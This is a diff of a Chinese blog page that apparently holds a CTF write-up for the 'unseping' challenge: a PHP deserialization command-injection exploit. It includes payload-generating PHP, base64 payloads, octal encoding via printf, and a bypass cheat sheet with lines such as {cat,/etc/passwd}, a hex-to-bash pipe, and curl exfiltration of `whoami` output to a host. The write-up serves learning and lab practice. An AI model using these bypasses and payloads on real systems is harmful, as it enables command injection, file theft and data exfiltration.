@@ -43,8 +43,11 @@
 <meta property="og:image" content="http://example.com/2023/03/26/web01/file_include1.png">
 <meta property="og:image" content="http://example.com/2023/03/26/web01/file_include2.png">
 <meta property="og:image" content="http://example.com/2023/03/26/web01/unseping1.png">
+<meta property="og:image" content="http://example.com/2023/03/26/web01/unseping2.png">
+<meta property="og:image" content="http://example.com/2023/03/26/web01/unseping3.png">
+<meta property="og:image" content="http://example.com/2023/03/26/web01/unseping4.png">
 <meta property="article:published_time" content="2023-03-26T08:30:17.000Z">
-<meta property="article:modified_time" content="2023-05-06T13:23:52.254Z">
+<meta property="article:modified_time" content="2023-05-12T13:09:33.285Z">
 <meta property="article:author" content="想有双手">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/2023/03/26/web01/vim%E5%BC%82%E5%B8%B8%E9%80%80%E5%87%BA.png">
@@ -240,7 +243,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.1k 字
+          5.8k 字
         
       </span>
     
@@ -251,7 +254,7 @@
         
         
         
-          27 分钟
+          49 分钟
         
       </span>
     
@@ -396,6 +399,35 @@
 <hr>
 <h3 id="12-unseping"><a href="#12-unseping" class="headerlink" title="12.unseping"></a>12.unseping</h3><p>贴脸开大，还是读代码</p>
 <p><img src="unseping1.png" srcset="/img/loading.gif" lazyload alt="unseping1"></p>
+<p>这个是反序列化，但是这个题没用上wakeup()，主要是命令执行，但是代码中可以看到，args是一个数组，数组中的ls等等命令都被拦了，那就绕过，这里采用反斜杠‘\’绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>&#125;<br>  <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l\s&#x27;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://c.runoob.com/compile/1/">PHP在线编译工具</a></p>
+<p>输出：Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozOiJsXHMiO319</p>
+<p><img src="unseping2.png" srcset="/img/loading.gif" lazyload alt="unseping2"></p>
+<p>看到：array(2) {  [0]&#x3D;&gt;  string(12) “flag_1s_here”  [1]&#x3D;&gt;  string(9) “index.php” }</p>
+<p>在这有个问题，为啥array(‘dir’)和lsarray(‘l\s’)不同：</p>
+<p>array(1) {  [0]&#x3D;&gt;  string(23) “flag_1s_here  index.php” }</p>
+<p>但无论如何我们看到了flag_1s_here</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l\s$&#123;IFS&#125;fl\ag_1s_here&#x27;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>重复的地方不再赘述，这里的重点是绕过空格及flag关键字的过滤，依然采用\绕过，空格用${IFS}绕过</p>
+<p>得到：Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoyMjoibFxzJHtJRlN9ZmxcYWdfMXNfaGVyZSI7fX0&#x3D;</p>
+<p>POST提交：</p>
+<p><img src="unseping3.png" srcset="/img/loading.gif" lazyload alt="unseping3"></p>
+<p>有个php文件，但是；和&amp;和&#x2F;都被拦了，没法绕，换个方法，把字符变成八进制，看了一下别人写的，唯一一个疑点就是为啥是’\%o’。我试了一下，加一个\是没效果的，具体为啥我没深究，两个\就行了，附上C语言脚本：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">/* code */</span><br>    <span class="hljs-type">char</span> site[] = <span class="hljs-string">&quot;cat flag_1s_here/flag_831b69012c67b35f.php&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span> site / <span class="hljs-keyword">sizeof</span> site[<span class="hljs-number">0</span>]; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\\%o&quot;</span>,site[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.nhooo.com/tool/c/">C语言在线编译</a></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">\<span class="hljs-number">143\141\164\40</span>\<span class="hljs-number">146\154\141\147</span>\<span class="hljs-number">137\61\163\137</span>\<span class="hljs-number">150\145\162\145</span>\<span class="hljs-number">57\146\154\141</span>\<span class="hljs-number">147\137\70\63</span>\<span class="hljs-number">61\142\66\71</span>\<span class="hljs-number">60\61\62\143</span>\<span class="hljs-number">66\67\142\63</span>\<span class="hljs-number">65\146\56\160</span>\<span class="hljs-number">150\160</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;$(printf$&#123;IFS&#125;&quot;\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160&quot;)&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<p><img src="unseping4.png" srcset="/img/loading.gif" lazyload alt="unseping4"></p>
+<p>还不是很明白为啥cat了还要$(printf)</p>
+<p>命令执行绕过</p>
+<p>1.正则校验时如过滤cat|flag|ls，在字符串中插入空的环境变量绕过如’l${Z}s’,并用 $${IFS}代替空格<br>2.过滤绕过：分隔符编码（url、base64）绕过<br>3.八进制绕过：如ls: l对应assic码108 108-&gt;八进制:154: $(printf “\154\163”)&#x2F;&#x2F;ls<br>4.十六进制绕过：echo “字符串转16进制的结果” | xxd -r -p|bash &#x2F;&#x2F;xxd:十六进制输出<br>5.linux内置分隔符：${IFS}$9、${IFS}、$IFS$9<br>6.使用重定向符： cat&lt;&gt;flag.php<br>7.$PS2:&gt; $PS4:+<br>8.关键词拆分命令绕过：a&#x3D;l;b&#x3D;s;ab<br>9.控制环境变量绕过: echo $PATH得到&#x2F;user&#x2F;local… 要哪个字符截取哪个字符<br>echo ${PATH:1:1} -&gt;u echo ${PATH:0:4} -&gt;&#x2F;usr<br>10.空值绕过：cat fl””ag cat fl’’ag cat “fl””ag”<br>11.反斜杠绕过：ca\t flag l\s<br>12.空变量：x代表1-9如ca${7}t a.txt-&gt;cat a.txt，在没有传入参数的情况下，这些特殊字符默认为空<br>wh$1oami wh${1}oami<br>who$@ami who${@}ami<br>whoa$<em>mi whoa${</em>}mi<br>13.花括号：在linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令 {cat,flag}<br>{cat,flag.php}<br>{cat,&#x2F;etc&#x2F;passwd}<br>{whoami,}<br>14.无回显的命令执行：可以通过curl命令将命令的结果输出到访问的url中<br>curl <a target="_blank" rel="noopener" href="http://www.com/%E5%8F%8D%E5%BC%95%E5%8F%B7whoami%E5%8F%8D%E5%BC%95%E5%8F%B7">www.com/反引号whoami反引号</a><br>15.其他读文件命令<br>bash tac nl more less head tail vi cat bzmore bzless paste sort</p>
+<p><a href>原文链接</a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53385700/article/details/128741076">https://blog.csdn.net/qq_53385700/article/details/128741076</a></p>
 
                 
               </div>
